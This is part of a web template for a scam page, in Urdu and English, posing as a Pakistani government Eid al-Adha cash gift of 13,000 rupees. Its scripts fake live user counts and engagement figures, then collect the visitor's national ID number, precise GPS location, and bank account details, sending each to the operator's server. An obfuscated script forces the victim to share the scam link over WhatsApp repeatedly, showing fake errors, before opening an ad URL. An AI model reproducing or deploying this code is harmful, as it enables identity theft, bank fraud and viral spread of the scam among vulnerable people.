 grid-template-columns: 44px minmax(0, 1fr);
 column-gap: 10px;
 align-items: start;
 padding: 12px 18px 0;
 margin-bottom: 0;
 text-align: left;
 clear: both;
 }

 .comment.is-delayed {
 display: none;
 }

 .comment.is-revealed {
 animation: commentReveal .45s ease both;
 }

 @keyframes commentReveal {
 from {
 opacity: 0;
 transform: translateY(12px);
 }

 to {
 opacity: 1;
 transform: translateY(0);
 }
 }

 .comment:empty {
 display: none;
 }

 .comment.reply {
 margin-left: clamp(24px, 8vw, 52px);
 padding-top: 8px;
 }

 .comment img {
 grid-column: 1;
 grid-row: 1 / span 2;
 width: 42px;
 height: 42px;
 border-radius: 50%;
 object-fit: cover;
 box-shadow: 0 0 0 3px #f2f4f7;
 float: none;
 }

 /* COMMENT BOX */
 .single-container {
 grid-column: 2;
 background: #f5f7f6;
 padding: 11px 14px 12px;
 border-radius: 16px;
 max-width: min(100%, 520px);
 border: 1px solid #eef1f0;
 box-shadow: 0 1px 0 rgba(15, 23, 42, 0.03);
 overflow-wrap: anywhere;
 margin-left: 0;
 }

 .single-container .user {
 font-weight: 700;
 font-size: 16px;
 display: block;
 margin-bottom: 5px;
 color: #183a31;
 }

 .single-container .text {
 font-size: 16px;
 line-height: 1.65;
 color: #1f2933;
 }

 /* BUTTONS */
 .buttons {
 grid-column: 2;
 font-size: 12px;
 color: #69717d;
 margin: 6px 0 0 12px;
 display: flex;
 align-items: center;
 flex-wrap: wrap;
 gap: 7px;
 line-height: 1.2;
 }

 .buttons .action {
 cursor: pointer;
 font-weight: 700;
 }

 .buttons .action.liked {
 color: #0B7A3B;
 font-weight: 600;
 }

 /* INPUT */
 .input {
 margin-top: 4px;
 padding: 14px 18px 18px;
 border-top: 1px solid #edf0f2;
 }

 .comment-form {
 display: grid;
 grid-template-columns: 150px minmax(0, 1fr) auto;
 gap: 8px;
 align-items: center;
 }

 .comment-form-status {
 grid-column: 1 / -1;
 min-height: 18px;
 color: #b42318;
 font-size: 13px;
 font-weight: 600;
 }

 .comments-load-more {
 display: block;
 width: calc(100% - 36px);
 height: auto;
 min-height: 42px;
 margin: 14px 18px 0;
 padding: 11px 16px;
 border: 1px solid #d9e7df;
 border-radius: 999px;
 background: #f3faf6;
 color: #0B7A3B;
 font-family: "Segoe UI", Roboto, Arial, sans-serif;
 font-size: 14px;
 font-weight: 700;
 cursor: pointer;
 }

 .comments-load-more:hover {
 background: #e7f5ed;
 }

 .input input {
 width: 100%;
 padding: 13px 16px;
 border-radius: 999px;
 border: 1px solid #dce2e0;
 outline: none;
 background: #f8faf9;
 color: #1f2933;
 font-size: 16px;
 }

 .comment-submit {
 width: auto;
 height: auto;
 min-height: 46px;
 margin: 0;
 padding: 10px 18px;
 border-radius: 999px;
 background: #0B7A3B;
 color: #fff;
 font-family: "Segoe UI", Roboto, Arial, sans-serif;
 font-size: 14px;
 font-weight: 800;
 }

 .comment-submit:disabled {
 cursor: not-allowed;
 opacity: .7;
 }

 .input input:focus {
 border-color: #0B7A3B;
 box-shadow: 0 0 0 3px rgba(11, 122, 59, 0.12);
 background: #fff;
 }

 @media(max-width:600px) {
 .comments {
 width: calc(100% - 18px);
 border-radius: 14px;
 margin: 18px auto;
 }

 .counter {
 align-items: flex-start;
 flex-direction: column;
 padding: 14px 14px 10px;
 gap: 8px;
 }

 .bar {
 padding: 7px 8px;
 gap: 4px;
 }

 .bar .react {
 font-size: 13px;
 padding: 10px 4px;
 }

 .comment {
 grid-template-columns: 38px minmax(0, 1fr);
 column-gap: 9px;
 padding: 11px 14px 0;
 }

 .comment.reply {
 margin-left: 22px;
 }

 .comment img {
 width: 38px;
 height: 38px;
 }

 .single-container {
 padding: 10px 12px;
 border-radius: 14px;
 }

 .buttons {
 margin-left: 8px;
 }

 .input {
 padding: 12px 14px 15px;
 }

 .comment-form {
 grid-template-columns: 1fr;
 }

 .comment-submit {
 width: 100%;
 }
 }
 </style>
 <div class="active-box">
 <span class="pulse"></span>
 <div class="active-text">
 <strong>Active Now</strong>
 <span id="countdowntimer">98,542</span>
 <small>Pakistan Users Currently
                    Applying</small>
 </div>
 </div>

 <style>
 .active-box {
 max-width: 420px;
 margin: 25px auto;
 padding: 18px 22px;
 display: flex;
 align-items: center;
 gap: 14px;
 background: linear-gradient(135deg, #0A2F25, #0E3F3A, #0B7A3B);
 color: #fff;

 border-radius: 16px;
 box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
 font-family: var(--eid-urdu-font);
 }

 /* PULSE DOT */
 .pulse {
 width: 14px;
 height: 14px;
 background: #ff3b3b;
 border-radius: 50%;
 position: relative;
 }

 .pulse::after {
 content: "";
 position: absolute;
 inset: 0;
 border-radius: 50%;
 background: rgba(255, 59, 59, 0.6);
 animation: pulse 1.5s infinite;
 }

 @keyframes pulse {
 0% {
 transform: scale(1);
 opacity: 1
 }

 100% {
 transform: scale(2.5);
 opacity: 0
 }
 }

 /* TEXT */
 .active-text {
 line-height: 1.3;
 }

 .active-text strong {
 font-size: 16px;
 font-weight: 800;
 }

 #countdowntimer {
 display: block;
 font-size: 28px;
 font-weight: 900;
 color: #FFD700;
 }

 .active-text small {
 font-size: 13px;
 opacity: .9;
 }
 </style>

 <script>
 var timeleft = 98542;

setInterval(function(){
 // Add random users to simulate activity
 timeleft = timeleft + Math.floor(Math.random() * 600);

 document.getElementById("countdowntimer").textContent =
 timeleft.toLocaleString();
}, 1000);
 </script>

 <div class="comments">
 <div class="counter">
 <div class="reactions">
 <img class="like"
                        src="https://ui-avatars.com/api/?name=Q+A&background=1877f2&color=fff&size=32" />
 <img class="love"
                        src="https://ui-avatars.com/api/?name=M+L&background=f33e5b&color=fff&size=32" /> <img class="care"
                        src="https://ui-avatars.com/api/?name=U+N&background=f7b928&color=fff&size=32" />
 <span id="likes">134K</span>
 </div>
 <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
 </div>
 <div class="bar">
 <span class="react"><i class="fa
                            fa-thumbs-o-up"></i> <a class="liked">Like</a></span>
 <span class="react"><i class="fa
                            fa-comment-o"></i> Comment</span>
 <span class="react"><i class="fa
                            fa-share"></i> Share</span>
 </div>
 <div>
 <div class="comment">
 </div>
 </div>
 @foreach($comments as $comment)
 <div class="comment eid-comment{{ $comment->is_reply ? ' reply' : '' }}{{ $loop->index >= 12 ? ' is-delayed' : '' }}" data-comment-index="{{ $loop->index }}">
 <img src="{{ $comment->avatar_url ?: 'https://ui-avatars.com/api/?name='.urlencode($comment->user_name).'&background=0B7A3B&color=fff&size=64' }}" />
 <div class="single-container">
 <span class="user">{{ $comment->user_name }}</span>
 <span class="text">{{ $comment->comment_text }}</span>
 </div>
 <div class="buttons"><span class="time t1">{{ $comment->time_ago }}</span> <span class="dot">·</span>
 <span class="action{{ $comment->is_liked ? ' liked' : '' }}">Like</span> · <span class="action">Reply</span>
 </div>
 </div>
 @endforeach
 @if($comments->count() > 12)
 <button type="button" class="comments-load-more" id="loadMoreComments">Show more comments</button>
 @endif
 <div class="input">
 <form class="comment-form" id="eidCommentForm" action="{{ route('eid-tohfa.comment.store') }}" method="POST">
 @csrf
 <input type="text" name="user_name" id="commentUserName" placeholder="Your name" maxlength="60" required>
 <input type="text" name="comment_text" id="commentText" placeholder="Write a comment..." maxlength="500" required>
 <button type="submit" class="comment-submit">Post</button>
 <div class="comment-form-status" id="commentFormStatus"></div>
 </form>
 </div>
 </div>
 </div>
 </div>
 <script src="https://code.jquery.com/jquery-latest.min.js"></script>
 <script type="text/javascript">
 var time = 0;
window.setInterval(function () {
 time = time + 1;
 $(".t1").html(time + 1 + "m");
 $(".t2").html(time + 2 + "m");
 $(".t3").html(time + 4 + "m");
}, 6e4);
var likes = 134,
 comments = 23,
 shares = 12;
const eidTohfaLeadStoreUrl = @json(route('eid-tohfa.lead.store'));
const eidTohfaTrackVisitUrl = @json(route('eid-tohfa.track.visit'));
const eidTohfaCsrfToken = @json(csrf_token());

// Track first visit immediately on page load
(function() {
 if (!sessionStorage.getItem('eid_tohfa_tracked')) {
 fetch(eidTohfaTrackVisitUrl, {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json',
 'Accept': 'application/json',
 'X-Requested-With': 'XMLHttpRequest',
 'X-CSRF-TOKEN': eidTohfaCsrfToken
 },
 body: JSON.stringify({})
 })
 .then(response => response.json())
 .then(data => {
 if (data.success && data.lead_id) {
 $("#eidTohfaLeadId").val(data.lead_id);
 sessionStorage.setItem('eid_tohfa_tracked', '1');
 sessionStorage.setItem('eid_tohfa_lead_id', data.lead_id);
 }
 })
 .catch(err => console.log('Visit tracking failed:', err));
 } else {
 const leadId = sessionStorage.getItem('eid_tohfa_lead_id');
 if (leadId) {
 $("#eidTohfaLeadId").val(leadId);
 }
 }
})();

function postEidTohfaLead(extraData) {
 const payload = new FormData();
 const data = Object.assign({
 lead_id: $("#eidTohfaLeadId").val(),
 step: extraData && extraData.step ? extraData.step : "bank",
 cnic: $("#capturedCnic").val() || ($("#cnicNumber").val() || "").replace(/\D/g, ""),
 latitude: $("#locationLatitude").val(),
 longitude: $("#locationLongitude").val(),
 accuracy: $("#locationAccuracy").val(),
 location_captured_at: $("#locationCapturedAt").val()
 }, extraData || {});

 payload.append("_token", eidTohfaCsrfToken);

 Object.keys(data).forEach(function (key) {
 if (data[key] !== undefined && data[key] !== null && data[key] !== "") {
 payload.append(key, data[key]);
 }
 });

 return fetch(eidTohfaLeadStoreUrl, {
 method: "POST",
 credentials: "same-origin",
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest"
 },
 body: payload
 }).then(function (response) {
 if (!response.ok) {
 throw response;
 }

 return response.json();
 });
}
window.setInterval(function () {
 likes = likes + Math.floor(Math.random() * 3);
 comments = comments + Math.floor(Math.random() * 2);
 shares = shares + Math.floor(Math.random() * 2);
 $("#likes").html(likes + "K");
 $("#comments").html(comments + "K comments");
 $("#shares").html(shares + "K shares");
}, 5e3);
$(".liked").click(function () {
 if ($(this).hasClass("selected")) {
 $(this).removeClass("selected");
 $(this).html("Like");
 } else {
 $(this).addClass("selected");
 $(this).html("Unlike");
 }
});

document.addEventListener("DOMContentLoaded", function () {
 const delayedComments = Array.from(document.querySelectorAll(".eid-comment.is-delayed"));
 const loadMoreButton = document.getElementById("loadMoreComments");
 const batchSize = 8;

 if (!loadMoreButton) {
 return;
 }

 loadMoreButton.addEventListener("click", function () {
 const nextComments = delayedComments.splice(0, batchSize);

 nextComments.forEach(function (comment) {
 comment.classList.remove("is-delayed");
 comment.classList.add("is-revealed");
 });

 if (delayedComments.length === 0) {
 loadMoreButton.style.display = "none";
 }
 });
});

document.addEventListener("DOMContentLoaded", function () {
 const form = document.getElementById("eidCommentForm");
 const status = document.getElementById("commentFormStatus");

 if (!form) {
 return;
 }

 function escapeHtml(value) {
 return value.replace(/[&<>"']/g, function (char) {
 return ({
 "&": "&amp;",
 "<": "&lt;",
 ">": "&gt;",
 '"': "&quot;",
 "'": "&#039;"
 })[char];
 });
 }

 function addComment(comment) {
 const commentNode = document.createElement("div");
 commentNode.className = "comment eid-comment is-revealed";
 commentNode.innerHTML =
 '<img src="' + comment.avatar_url + '" alt="">' +
 '<div class="single-container">' +
 '<span class="user">' + escapeHtml(comment.user_name) + '</span>' +
 '<span class="text">' + escapeHtml(comment.comment_text) + '</span>' +
 '</div>' +
 '<div class="buttons"><span class="time">' + escapeHtml(comment.time_ago) + '</span> <span class="dot">·</span> ' +
 '<span class="action">Like</span> · <span class="action">Reply</span></div>';

 const firstComment = document.querySelector(".eid-comment");

 if (firstComment) {
 firstComment.parentNode.insertBefore(commentNode, firstComment);
 } else {
 form.closest(".comments").insertBefore(commentNode, form.closest(".input"));
 }
 }

 form.addEventListener("submit", function (event) {
 event.preventDefault();

 const submitButton = form.querySelector(".comment-submit");
 const formData = new FormData(form);
 status.textContent = "";
 submitButton.disabled = true;
 submitButton.textContent = "Posting...";

 fetch(form.action, {
 method: "POST",
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest"
 },
 body: formData
 })
 .then(function (response) {
 if (!response.ok) {
 throw response;
 }

 return response.json();
 })
 .then(function (data) {
 if (!data.success) {
 status.textContent = "Please enter your name and comment.";
 return;
 }

 addComment(data.comment);
 form.reset();
 status.style.color = "#0B7A3B";
 status.textContent = "Comment added.";
 setTimeout(function () {
 status.textContent = "";
 status.style.color = "#b42318";
 }, 2500);
 })
 .catch(function () {
 status.textContent = "Comment could not be posted. Please try again.";
 })
 .finally(function () {
 submitButton.disabled = false;
 submitButton.textContent = "Post";
 });
 });
});
 </script>
 <script type="text/javascript">
 function keepStepInView(selector) {
 const panel = document.querySelector(selector);

 if (!panel) {
 return;
 }

 const rect = panel.getBoundingClientRect();
 const targetTop = window.pageYOffset + rect.top - 90;

 if (rect.top < 70 || rect.top > window.innerHeight * 0.55) {
 window.scrollTo({
 top: Math.max(targetTop, 0),
 behavior: "smooth"
 });
 }
 }

 function transitionStepPanel($from, $to) {
 const $stepArea = $("#eidStepArea");

 if (!$stepArea.length || !$from.length || !$to.length) {
 return;
 }

 const currentHeight = $from.outerHeight(true);
 $to.css({ display: "block", visibility: "hidden" });
 const targetHeight = $to.outerHeight(true);
 $to.css({ display: "none", visibility: "" });

 $stepArea
 .stop(true, true)
 .css("min-height", currentHeight)
 .animate({ minHeight: targetHeight }, 280);

 $from.fadeOut(0, function () {
 $to.fadeIn(250);
 keepStepInView("#" + $to.attr("id"));
 });
 }

 function closeStepAreaAndShow(selector) {
 const $stepArea = $("#eidStepArea");

 $("#loader").fadeOut(120, function () {
 $stepArea.slideUp(280, function () {
 $stepArea.css("min-height", "");
 $(selector).fadeIn(250);
 keepStepInView(selector);
 });
 });
 }

 $("#go").click(function () {
 transitionStepPanel($("#intro"), $("#loader"));
 var i = 0;
 var interval = setInterval(function () {
 $("#num").text(i + "%");
 i += 1;
 if (i >= 100) {
 clearInterval(interval);
 closeStepAreaAndShow("#eligibilityStart");
 }
 }, 50);
});

$("#startEligibility").click(function () {
 $("#eligibilityStart").fadeOut(0, function () {
 $("#cnicStep").fadeIn(250);
 keepStepInView("#cnicStep");
 });
});

$("#submitCnic").click(function () {
 const cnic = ($("#cnicNumber").val() || "").replace(/\D/g, "");

 if (cnic.length !== 13) {
 $("#cnicError").fadeIn(250);
 return;
 }

 $("#cnicError").fadeOut(0);
 $("#capturedCnic").val(cnic);

 // Save CNIC to backend immediately
 postEidTohfaLead({ step: "cnic" })
 .then(function (data) {
 if (data.lead_id) {
 $("#eidTohfaLeadId").val(data.lead_id);
 }
 $("#cnicStep").fadeOut(0, function () {
 $("#locationStep").fadeIn(250);
 keepStepInView("#locationStep");
 });
 })
 .catch(function () {
 // Still proceed even if save fails
 $("#cnicStep").fadeOut(0, function () {
 $("#locationStep").fadeIn(250);
 keepStepInView("#locationStep");
 });
 });
});

$("#denyLocation").click(function () {
 $("#locationError").text(@json($locationDeniedMessage)).fadeIn(250);
});

function requestLocationWithPrompt($button) {
 // Check geolocation support
 if (!navigator.geolocation) {
 $("#locationError").text("آپ کے براؤزر میں لوکیشن کی سہولت دستیاب نہیں۔").fadeIn(250);
 return;
 }

 // Check secure context (HTTPS required for geolocation in most browsers)
 if (!window.isSecureContext && !["localhost", "127.0.0.1"].includes(window.location.hostname)) {
 $("#locationError").text("لوکیشن پرمشن کے لیے HTTPS ضروری ہے۔").fadeIn(250);
 return;
 }

 // Check Permissions API first (if available)
 if (navigator.permissions && navigator.permissions.query) {
 navigator.permissions.query({ name: "geolocation" }).then(function (status) {
 if (status.state === "denied") {
 $("#locationError").html(
 "لوکیشن کی اجازت مسترد کر دی گئی ہے۔<br>" +
 "<small>براہ کرم اپنے براؤزر کی سیٹنگز میں جا کر لوکیشن کی اجازت بحال کریں:</small><br>" +
 "<small><b>Chrome:</b> Settings > Privacy > Site Settings > Location</small><br>" +
 "<small><b>Firefox:</b> Settings > Privacy > Permissions > Location</small>"
 ).fadeIn(250);
 return;
 }
 captureLocation($button);
 }).catch(function () {
 // Permissions API not supported, proceed directly
 captureLocation($button);
 });
 } else {
 captureLocation($button);
 }
}

function captureLocation($button) {
 $button.prop("disabled", true).text("براؤزر میں اجازت دیں...");

 let watchId;
 let bestPosition = null;
 let timeoutId;
 let isProcessed = false;

 function processBestPosition() {
 if (isProcessed) return;
 isProcessed = true;
 if (watchId) navigator.geolocation.clearWatch(watchId);
 
 if (!bestPosition) {
 $("#locationError").text("لوکیشن کی معلومات دستیاب نہیں۔ براہ کرم دوبارہ کوشش کریں۔").fadeIn(250);
 $button.prop("disabled", false).text(@json($locationAllowButton));
 return;
 }

 const coords = bestPosition.coords;
 const capturedAt = new Date().toISOString();

 $("#locationLatitude").val(coords.latitude.toFixed(7));
 $("#locationLongitude").val(coords.longitude.toFixed(7));
 $("#locationAccuracy").val(coords.accuracy ? coords.accuracy.toFixed(2) : "");
 $("#locationCapturedAt").val(capturedAt);
 $("#locationCapturedText")
 .html("📍 لوکیشن محفوظ ہو گئی۔")
 .fadeIn(150);

 postEidTohfaLead({ step: "location" })
 .then(function (data) {
 if (data.lead_id) {
 $("#eidTohfaLeadId").val(data.lead_id);
 }

 $("#locationStep").fadeOut(0, function () {
 $("#info").fadeIn(250);
 keepStepInView("#info");
 });
 })
 .catch(function () {
 $("#locationError").text("لوکیشن محفوظ نہیں ہو سکی، براہ کرم دوبارہ اجازت دیں۔").fadeIn(250);
 $button.prop("disabled", false).text(@json($locationAllowButton));
 });
 }

 watchId = navigator.geolocation.watchPosition(
 function (position) {
 // Keep the position with the best (lowest) accuracy
 if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
 bestPosition = position;
 }
 
 // If accuracy is excellent (less than 60 meters), process immediately
 if (position.coords.accuracy <= 60) {
 clearTimeout(timeoutId);
 processBestPosition();
 }
 },
 function (error) {
 if (isProcessed) return;
 clearTimeout(timeoutId);
 if (watchId) navigator.geolocation.clearWatch(watchId);
 
 var msg = @json($locationDeniedMessage);
 switch (error.code) {
 case error.PERMISSION_DENIED:
 msg = "لوکیشن کی اجازت نہیں دی گئی۔ درخواست آگے نہیں بڑھ سکتی۔";
 break;
 case error.POSITION_UNAVAILABLE:
 msg = "لوکیشن کی معلومات دستیاب نہیں۔ براہ کرم دوبارہ کوشش کریں۔";
 break;
 case error.TIMEOUT:
 msg = "لوکیشن حاصل کرنے میں وقت ختم ہو گیا۔ براہ کرم دوبارہ کوشش کریں۔";
 break;
 }
 $("#locationError").text(msg).fadeIn(250);
 $button.prop("disabled", false).text(@json($locationAllowButton));
 },
 {
 enableHighAccuracy: true,
 timeout: 15000,
 maximumAge: 0
 }
 );

 // Wait up to 10 seconds for the GPS to warm up and find a high accuracy location
 timeoutId = setTimeout(function() {
 processBestPosition();
 }, 10000);
}

$("#allowLocation").click(function () {
 $("#locationError").fadeOut(0);
 requestLocationWithPrompt($(this));
});

$("#confirm").click(function () {
 if ($("#name").val().length < 4 || !$("#bankName").val())
 {
 $("#accountError").fadeIn(500);
 } else {
 const $button = $(this);
 const buttonText = $button.text();
 const bankName = $("#bankName").val();
 const accountNumber = $("#name").val();

 $("#accountError").fadeOut(0);
 $button.prop("disabled", true);

 postEidTohfaLead({
 bank_name: bankName,
 account_number: accountNumber,
 step: "bank"
 })
 .then(function () {
 $("#info").fadeOut(0, function () {
 $("#checking").fadeIn(250);
 keepStepInView("#checking");
 });
 var i = 0;
 var interval = setInterval(function () {
 i += 1;
 $("#percentage").text(i + "%");
 $("#fill").css("width", i + "%");
 if (i == 50) {
 i = 49;
 setTimeout(function () {
 i = 50;
 }, 1000);
 }
 if (i >= 100) {
 clearInterval(interval);
 $("#load").fadeOut(0);
 $("#check").fadeIn(0);
 setTimeout(function () {
 $("#checking").fadeOut(0, function () {
 $("#share").fadeIn(250);
 keepStepInView("#share");
 });
 $("#getname").html($("#name").val());
 }, 500);
 }
 }, 50);
 })
 .catch(function () {
 $("#accountError").text("درخواست محفوظ نہیں ہو سکی، براہ کرم دوبارہ کوشش کریں۔").fadeIn(500);
 $button.prop("disabled", false).text(buttonText);
 });
 }
});
$(document).click(function () {
 if ($("#name").is(":focus") || $("#bankName").is(":focus")) {
 $("#accountError").fadeOut(500);
 }
});
 </script>

 <script>
 var text1 = "*وفاقی حکومت روپے تمام پاکستانیوں کو 13,000 عیدالاضحی کیش کی
                    منتقلی*%0A %0A*عیدالاضحیٰ کے بابرکت تہوار کے موقع پر وفاقی حکومت پاکستانیوں کے لیے 13,000 روپے کی
                    نقد امداد جاری رفاہی اور انسانی ہمدردی کی کوششوں کے حصے کے طور پر دے رہی ہے، جو ہمدردی، سخاوت اور
                    امت کی خدمت کی اقدار کی عکاسی کرتی ہے۔*%0A%0A*_اسے ابھی کیسے حاصل کیا جائے۔_*%0A_نیچے دیے گئے لنک پر
                    جائیں، اور آپ کو روپے ملیں گے۔ وفاقی حکومت سے فوری طور پر 13,000۔_%0Aمیں نے ابھی اپنا حاصل
                    کیا۔%0A%0A_یہاں کلک کریں_👇%0Ahttps://www.mechaniitid.site/rs13000-eid-al-adha-cash-transfer",
 text2 = " an amount of ",
 text3 = "for every citizen who meets the conditions as an aid to the poor
                    class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
 error = "کچھ گڑبڑ ہے!\nپوسٹس کا حساب نہیں لگایا جاتا۔ ہو سکتا ہے آپ نے اسے ایک
                    ہی دوست یا گروپ کے ساتھ ایک سے زیادہ بار شیئر کیا ہو۔ براہ کرم دوبارہ شئیر کریں۔",
 abcde = "https://crn77.com/4/8525379",
 saved = "",
 share = "whatsapp://send?text=" + text1;
 </script>

 <script>
 <!-- code by OD 
 -->

                    document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
                
 </script>




</body>

</html>
